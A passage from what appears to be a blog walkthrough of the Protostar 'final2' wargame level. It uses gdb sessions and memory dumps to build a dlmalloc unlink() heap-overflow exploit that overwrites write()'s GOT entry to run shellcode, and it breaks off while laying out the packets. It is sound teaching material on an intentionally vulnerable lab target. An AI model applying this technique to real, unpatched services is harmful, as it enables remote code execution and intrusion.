<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">ssh</span> <span class="o">-</span><span class="n">o</span> <span class="s">&quot;UserKnownHostsFile=/dev/null&quot;</span> <span class="o">-</span><span class="n">o</span> <span class="s">&quot;StrictHostKeyChecking=no&quot;</span> <span class="n">root</span><span class="nd">@192.168.99.107</span>
</span></code></pre></td></tr></table></div></figure>


<p>You can see final2 is already running. We get the PID.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">root</span><span class="nd">@protostar</span><span class="p">:</span><span class="o">/</span><span class="c"># ps aux | grep final2</span>
</span><span class='line'><span class="n">root</span>      <span class="mi">1495</span>  <span class="mf">0.0</span>  <span class="mf">0.2</span>   <span class="mi">1544</span>   <span class="mi">284</span> <span class="err">?</span>        <span class="n">Ss</span>   <span class="mi">10</span><span class="p">:</span><span class="mi">44</span>   <span class="mi">0</span><span class="p">:</span><span class="mo">00</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">protostar</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">final2</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now attach gdb to it. Since the program forks a new child process to handle requests, we <code>set follow-fork-mode child</code> to make gdb follow the child process instead of the parent. <code>set detach-on-fork off</code> makes gdb hold control of both parent and child (I&rsquo;m not sure if this is necessary). The other two gdb settings are my personal preferences.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">root</span><span class="nd">@protostar</span><span class="p">:</span><span class="o">/</span><span class="c"># gdb /opt/protostar/bin/final2 -p 1495</span>
</span><span class='line'>
</span><span class='line'><span class="n">GNU</span> <span class="n">gdb</span> <span class="p">(</span><span class="n">GDB</span><span class="p">)</span> <span class="mf">7.0</span><span class="o">.</span><span class="mi">1</span><span class="o">-</span><span class="n">debian</span>
</span><span class='line'><span class="n">Copyright</span> <span class="p">(</span><span class="n">C</span><span class="p">)</span> <span class="mi">2009</span> <span class="n">Free</span> <span class="n">Software</span> <span class="n">Foundation</span><span class="p">,</span> <span class="n">Inc</span><span class="o">.</span>
</span><span class='line'><span class="n">License</span> <span class="n">GPLv3</span><span class="o">+</span><span class="p">:</span> <span class="n">GNU</span> <span class="n">GPL</span> <span class="n">version</span> <span class="mi">3</span> <span class="ow">or</span> <span class="n">later</span> <span class="o">&lt;</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">gnu</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">licenses</span><span class="o">/</span><span class="n">gpl</span><span class="o">.</span><span class="n">html</span><span class="o">&gt;</span>
</span><span class='line'><span class="n">This</span> <span class="ow">is</span> <span class="n">free</span> <span class="n">software</span><span class="p">:</span> <span class="n">you</span> <span class="n">are</span> <span class="n">free</span> <span class="n">to</span> <span class="n">change</span> <span class="ow">and</span> <span class="n">redistribute</span> <span class="n">it</span><span class="o">.</span>
</span><span class='line'><span class="n">There</span> <span class="ow">is</span> <span class="n">NO</span> <span class="n">WARRANTY</span><span class="p">,</span> <span class="n">to</span> <span class="n">the</span> <span class="n">extent</span> <span class="n">permitted</span> <span class="n">by</span> <span class="n">law</span><span class="o">.</span>  <span class="n">Type</span> <span class="s">&quot;show copying&quot;</span>
</span><span class='line'><span class="ow">and</span> <span class="s">&quot;show warranty&quot;</span> <span class="k">for</span> <span class="n">details</span><span class="o">.</span>
</span><span class='line'><span class="n">This</span> <span class="n">GDB</span> <span class="n">was</span> <span class="n">configured</span> <span class="k">as</span> <span class="s">&quot;i486-linux-gnu&quot;</span><span class="o">.</span>
</span><span class='line'><span class="n">For</span> <span class="n">bug</span> <span class="n">reporting</span> <span class="n">instructions</span><span class="p">,</span> <span class="n">please</span> <span class="n">see</span><span class="p">:</span>
</span><span class='line'><span class="o">&lt;</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="o">.</span><span class="n">gnu</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">software</span><span class="o">/</span><span class="n">gdb</span><span class="o">/</span><span class="n">bugs</span><span class="o">/&gt;...</span>
</span><span class='line'><span class="n">Reading</span> <span class="n">symbols</span> <span class="kn">from</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">protostar</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">final2</span><span class="o">...</span><span class="n">done</span><span class="o">.</span>
</span><span class='line'><span class="n">Attaching</span> <span class="n">to</span> <span class="n">program</span><span class="p">:</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">protostar</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">final2</span><span class="p">,</span> <span class="n">process</span> <span class="mi">1495</span>
</span><span class='line'><span class="n">Reading</span> <span class="n">symbols</span> <span class="kn">from</span> <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">libc</span><span class="o">.</span><span class="n">so</span><span class="o">.</span><span class="mf">6.</span><span class="o">..</span><span class="n">Reading</span> <span class="n">symbols</span> <span class="kn">from</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">debug</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">libc</span><span class="o">-</span><span class="mf">2.11</span><span class="o">.</span><span class="mf">2.</span><span class="n">so</span><span class="o">...</span><span class="n">done</span><span class="o">.</span>
</span><span class='line'><span class="p">(</span><span class="n">no</span> <span class="n">debugging</span> <span class="n">symbols</span> <span class="n">found</span><span class="p">)</span><span class="o">...</span><span class="n">done</span><span class="o">.</span>
</span><span class='line'><span class="n">Loaded</span> <span class="n">symbols</span> <span class="k">for</span> <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">libc</span><span class="o">.</span><span class="n">so</span><span class="o">.</span><span class="mi">6</span>
</span><span class='line'><span class="n">Reading</span> <span class="n">symbols</span> <span class="kn">from</span> <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="o">.</span><span class="n">so</span><span class="o">.</span><span class="mf">2.</span><span class="o">..</span><span class="n">Reading</span> <span class="n">symbols</span> <span class="kn">from</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">debug</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="mf">2.11</span><span class="o">.</span><span class="mf">2.</span><span class="n">so</span><span class="o">...</span><span class="n">done</span><span class="o">.</span>
</span><span class='line'><span class="p">(</span><span class="n">no</span> <span class="n">debugging</span> <span class="n">symbols</span> <span class="n">found</span><span class="p">)</span><span class="o">...</span><span class="n">done</span><span class="o">.</span>
</span><span class='line'><span class="n">Loaded</span> <span class="n">symbols</span> <span class="k">for</span> <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="o">.</span><span class="n">so</span><span class="o">.</span><span class="mi">2</span>
</span><span class='line'><span class="n">accept</span> <span class="p">()</span> <span class="n">at</span> <span class="o">../</span><span class="n">sysdeps</span><span class="o">/</span><span class="n">unix</span><span class="o">/</span><span class="n">sysv</span><span class="o">/</span><span class="n">linux</span><span class="o">/</span><span class="n">i386</span><span class="o">/</span><span class="n">socket</span><span class="o">.</span><span class="n">S</span><span class="p">:</span><span class="mi">64</span>
</span><span class='line'><span class="mi">64</span>    <span class="o">../</span><span class="n">sysdeps</span><span class="o">/</span><span class="n">unix</span><span class="o">/</span><span class="n">sysv</span><span class="o">/</span><span class="n">linux</span><span class="o">/</span><span class="n">i386</span><span class="o">/</span><span class="n">socket</span><span class="o">.</span><span class="n">S</span><span class="p">:</span> <span class="n">No</span> <span class="n">such</span> <span class="nb">file</span> <span class="ow">or</span> <span class="n">directory</span><span class="o">.</span>
</span><span class='line'>  <span class="ow">in</span> <span class="o">../</span><span class="n">sysdeps</span><span class="o">/</span><span class="n">unix</span><span class="o">/</span><span class="n">sysv</span><span class="o">/</span><span class="n">linux</span><span class="o">/</span><span class="n">i386</span><span class="o">/</span><span class="n">socket</span><span class="o">.</span><span class="n">S</span>
</span><span class='line'>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="nb">set</span> <span class="n">follow</span><span class="o">-</span><span class="n">fork</span><span class="o">-</span><span class="n">mode</span> <span class="n">child</span>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="nb">set</span> <span class="n">detach</span><span class="o">-</span><span class="n">on</span><span class="o">-</span><span class="n">fork</span> <span class="n">off</span>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="nb">set</span> <span class="n">disassembly</span><span class="o">-</span><span class="n">flavor</span> <span class="n">intel</span>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="nb">set</span> <span class="n">pagination</span> <span class="n">off</span>
</span></code></pre></td></tr></table></div></figure>


<p>Disassemble <code>get_requests()</code> to find where <code>check_path()</code> returns.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">disassemble</span> <span class="n">get_requests</span>
</span><span class='line'><span class="n">Dump</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">code</span> <span class="k">for</span> <span class="n">function</span> <span class="n">get_requests</span><span class="p">:</span>
</span><span class='line'><span class="mh">0x0804bd47</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">0</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">push</span>   <span class="n">ebp</span>
</span><span class='line'><span class="mh">0x0804bd48</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">1</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">mov</span>    <span class="n">ebp</span><span class="p">,</span><span class="n">esp</span>
</span><span class='line'><span class="o">...</span>
</span><span class='line'><span class="mh">0x0804bdce</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">135</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="n">eax</span>
</span><span class='line'><span class="mh">0x0804bdd1</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">138</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">call</span>   <span class="mh">0x804bcd0</span> <span class="o">&lt;</span><span class="n">check_path</span><span class="o">&gt;</span>
</span><span class='line'><span class="mh">0x0804bdd6</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">143</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">jmp</span>    <span class="mh">0x804bd57</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">16</span><span class="o">&gt;</span>
</span><span class='line'><span class="mh">0x0804bddb</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">148</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">nop</span>
</span><span class='line'><span class="o">...</span>
</span><span class='line'><span class="mh">0x0804be25</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">222</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">ret</span>
</span><span class='line'><span class="n">End</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">dump</span><span class="o">.</span>
</span><span class='line'>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="k">break</span> <span class="o">*</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">143</span>
</span><span class='line'><span class="n">Breakpoint</span> <span class="mi">1</span> <span class="n">at</span> <span class="mh">0x804bdd6</span><span class="p">:</span> <span class="nb">file</span> <span class="n">final2</span><span class="o">/</span><span class="n">final2</span><span class="o">.</span><span class="n">c</span><span class="p">,</span> <span class="n">line</span> <span class="mf">51.</span>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
</span><span class='line'><span class="n">Continuing</span><span class="o">.</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now run our Python script in another terminal to send the strings.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">python</span> <span class="n">test</span><span class="o">.</span><span class="n">py</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">99.107</span>
</span></code></pre></td></tr></table></div></figure>


<p>Our gdb terminal will show the following.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="p">[</span><span class="n">New</span> <span class="n">process</span> <span class="mi">2322</span><span class="p">]</span>
</span><span class='line'><span class="p">[</span><span class="n">Switching</span> <span class="n">to</span> <span class="n">process</span> <span class="mi">2322</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'><span class="n">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="n">get_requests</span> <span class="p">(</span><span class="n">fd</span><span class="o">=</span><span class="mi">4</span><span class="p">)</span> <span class="n">at</span> <span class="n">final2</span><span class="o">/</span><span class="n">final2</span><span class="o">.</span><span class="n">c</span><span class="p">:</span><span class="mi">51</span>
</span><span class='line'><span class="mi">51</span>    <span class="n">final2</span><span class="o">/</span><span class="n">final2</span><span class="o">.</span><span class="n">c</span><span class="p">:</span> <span class="n">No</span> <span class="n">such</span> <span class="nb">file</span> <span class="ow">or</span> <span class="n">directory</span><span class="o">.</span>
</span><span class='line'>  <span class="ow">in</span> <span class="n">final2</span><span class="o">/</span><span class="n">final2</span><span class="o">.</span><span class="n">c</span>
</span><span class='line'><span class="n">Current</span> <span class="n">language</span><span class="p">:</span>  <span class="n">auto</span>
</span><span class='line'><span class="n">The</span> <span class="n">current</span> <span class="n">source</span> <span class="n">language</span> <span class="ow">is</span> <span class="s">&quot;auto; currently c&quot;</span><span class="o">.</span>
</span></code></pre></td></tr></table></div></figure>


<p>Print <code>buf</code> to show the address it points to. Then examine the first 40 DWORDs in hexadecimal
starting at address <code>0x804e000</code> (<code>0x804e008 - 0x8</code> so we can see the first heap chunk&rsquo;s metadata in
the previous 8 bytes). We can see its <code>FSRD</code> (<code>0x44525346</code>) followed by lots of <code>A</code>s (<code>0x41</code>s) and
ends in <code>/AAAA</code>.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">p</span> <span class="n">buf</span>
</span><span class='line'><span class="err">$</span><span class="mi">1</span> <span class="o">=</span> <span class="mh">0x804e008</span> <span class="s">&quot;FSRD&quot;</span><span class="p">,</span> <span class="s">&#39;A&#39;</span> <span class="o">&lt;</span><span class="n">repeats</span> <span class="mi">119</span> <span class="n">times</span><span class="o">&gt;</span><span class="p">,</span> <span class="s">&quot;/AAAA&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="mi">40</span><span class="n">wx</span> <span class="mh">0x804e000</span>
</span><span class='line'><span class="mh">0x804e000</span><span class="p">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000089</span>  <span class="mh">0x44525346</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x804e010</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x804e020</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x804e030</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x804e040</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x804e050</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x804e060</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x804e070</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x804e080</span><span class="p">:</span> <span class="mh">0x2f414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000f79</span>
</span><span class='line'><span class="mh">0x804e090</span><span class="p">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span></code></pre></td></tr></table></div></figure>


<p>We continue and examine the memory of the first chunk again. We expect the memory at address
<code>0x804e084</code> to be <code>BBBB</code> or <code>0x42424242</code> which it is.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
</span><span class='line'><span class="n">Continuing</span><span class="o">.</span>
</span><span class='line'>
</span><span class='line'><span class="n">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="n">get_requests</span> <span class="p">(</span><span class="n">fd</span><span class="o">=</span><span class="mi">4</span><span class="p">)</span> <span class="n">at</span> <span class="n">final2</span><span class="o">/</span><span class="n">final2</span><span class="o">.</span><span class="n">c</span><span class="p">:</span><span class="mi">51</span>
</span><span class='line'><span class="mi">51</span>    <span class="ow">in</span> <span class="n">final2</span><span class="o">/</span><span class="n">final2</span><span class="o">.</span><span class="n">c</span>
</span><span class='line'>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="mi">40</span><span class="n">wx</span> <span class="mh">0x804e000</span>
</span><span class='line'><span class="mh">0x804e000</span><span class="p">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000089</span>  <span class="mh">0x44525346</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x804e010</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x804e020</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x804e030</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x804e040</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x804e050</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x804e060</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x804e070</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x804e080</span><span class="p">:</span> <span class="mh">0x2f414141</span>  <span class="mh">0x42424242</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000089</span>
</span><span class='line'><span class="mh">0x804e090</span><span class="p">:</span> <span class="mh">0x44525346</span>  <span class="mh">0x544f4f52</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span></code></pre></td></tr></table></div></figure>


<h2>Exploiting <code>free()</code></h2>

<p>With the ability to overwrite bytes following a strategically placed <code>/</code> character in the previous
heap chunk, we can perform a classic heap overflow exploit using the <code>unlink()</code> technique. We can&rsquo;t
overwrite the first chunk&rsquo;s heap metadata because there&rsquo;s no way to insert a <code>/</code> before it. So we
target the second chunk&rsquo;s heap metadata. I&rsquo;m now going to rehash some of the dlmalloc algorithm
explained in my <a href="https://www.davidxia.com/2020/04/how-to-exploit-dlmalloc-unlink/?asdf">previous post</a> because it can be a little confusing.</p>

<p>When the first chunk is freed, <code>unlink()</code> will run on the second chunk if the second chunk has
already been freed. dlmalloc determines if the second chunk is freed by checking the third chunk&rsquo;s
<code>PREV_INUSE</code> bit which is the lowest bit of the second byte of the chunk. In order to find the start
of the third chunk, dlmalloc adds the value of the chunk&rsquo;s second DWORD bitmasked with 0x1 (i.e.
ignoring the lowest bit) to the chunk&rsquo;s starting address. So in the above memory dump, the
start of the second chunk is <code>0x00000089 &amp;0x1 + 0x804e000 = 0x804e088</code>. Likewise, the start of the
third chunk is <code>0x00000089 &amp;0x1 + 0x804e088 = 0x804e110</code>. So we have to figure out a way to write
arbitrary bytes to the third chunk.</p>

<p>But we&rsquo;re already writing arbitrary bytes to the second chunk&rsquo;s metadata. Is there way to make
dlmalloc think the third chunk starts somewhere in memory where we&rsquo;re already writing bytes for the
second chunk? Nothing in dlmalloc checks the third chunk is actually right after the second.
dlmalloc just blindly performs an addition on two numbers. One of these numbers is the second
chunk&rsquo;s size which we can set via the <code>memmove()</code> bug. Let&rsquo;s make dlmalloc think the third chunk is
actually four bytes before the start of the second chunk. The second chunk is at <code>0x804e088</code> so the
&ldquo;virtual&rdquo; third chunk will be at <code>0x804e084</code>. What number added to <code>0x804e088</code> equals <code>0x804e084</code>?
-4. [Integer overflow] means adding <code>0xfffffffc</code> is the same as adding -4 (<code>0x804e088 + 0xfffffffc =
0x804e084</code>). So the second chunk&rsquo;s second DWORD representing its size must be <code>0xfffffffc</code>, and the
<code>PREV_INUSE</code> bit of the third chunk must be 0. <code>0xfffffffc 0xfffffffc</code> will work.</p>

<p>Once we fool dlmalloc into thinking the second chunk is already freed, dlmalloc will <code>unlink()</code> it.
So we need to craft values for the second chunk&rsquo;s forwards and backwards pointers such that
<code>unlink()</code> will redirect code execution to another region of memory where we can insert shellcode.</p>

<p>In the Heap3 level we overwrote the address of a function in the procedure linkage table (PLT) with
the address of shellcode. We can do the same here. Since we send two packets, <code>dll</code> will be 2. The
for-loop will call <code>write()</code> twice. The first <code>free()</code> will overwrite <code>write()</code>&rsquo;s address in the
PLT. Let&rsquo;s find the PLT address containing the address of <code>write()</code>. We <code>disassemble get_requests</code>,
examine the address <code>0x8048dfc</code> as an instruction to get the address in the global offset table
(GOT) that points to the dynamically linked library containing the actual <code>write()0</code> function. We
want to overwrite the contents of <code>0x804d41c</code> with the address of our shellcode. Since <code>unlink()</code>
adds 12 to the forwards pointer, we need to make the forward pointer <code>0x804d41c - 12</code>.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">disassemble</span> <span class="n">get_requests</span>
</span><span class='line'>
</span><span class='line'><span class="n">Dump</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">code</span> <span class="k">for</span> <span class="n">function</span> <span class="n">get_requests</span><span class="p">:</span>
</span><span class='line'><span class="o">...</span>
</span><span class='line'><span class="mh">0x0804be01</span> <span class="o">&lt;</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">186</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">call</span>   <span class="mh">0x8048dfc</span> <span class="o">&lt;</span><span class="n">write</span><span class="nd">@plt</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">...</span>
</span><span class='line'><span class="n">End</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">dump</span><span class="o">.</span>
</span><span class='line'>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">i</span> <span class="mh">0x8048dfc</span>
</span><span class='line'><span class="mh">0x8048dfc</span> <span class="o">&lt;</span><span class="n">write</span><span class="nd">@plt</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">jmp</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">ds</span><span class="p">:</span><span class="mh">0x804d41c</span>
</span><span class='line'>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">x</span> <span class="mh">0x804d41c</span>
</span><span class='line'><span class="mh">0x804d41c</span> <span class="o">&lt;</span><span class="n">_GLOBAL_OFFSET_TABLE_</span><span class="o">+</span><span class="mi">64</span><span class="o">&gt;</span><span class="p">:</span>    <span class="mh">0xb7f53c70</span>
</span></code></pre></td></tr></table></div></figure>


<h2>Crafting Malicious Packets</h2>

<p>Where should we put our shellcode? We can include it in our first request. The first two DWORDs will
be clobbered by dlmalloc when it sets the first chunk&rsquo;s forwards and backwards pointers. The first
word needs to be used for <code>FSRD</code> anyways. So let&rsquo;s put shellcode at <code>0x804e010</code>. This address will
be our backwards pointer.</p>

<p>To summarize, this is how the packets should look so far.</p>

<p>The first payload must start with <code>FSRD</code>. Then we need four bytes of filler bytes <code>AAAA</code> followed by
shellcode (TBD). The last byte must be <code>/</code> for <code>memmove()</code>. The payload must be 128 bytes. The
spaces in the payload visualization below are just for readability. They shouldn&rsquo;t be in the actual
payload.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">FSRD</span> <span class="n">AAAA</span> <span class="o">&lt;</span><span class="n">shellcode</span><span class="o">&gt;</span> <span class="n">AAAA</span> <span class="o">...</span> <span class="n">AAA</span><span class="o">/</span>
</span></code></pre></td></tr></table></div></figure>


<p>The second payload must start with <code>FSRDROOT</code>. Then have <code>0xfffffffc 0xfffffffc</code>. Then the forward
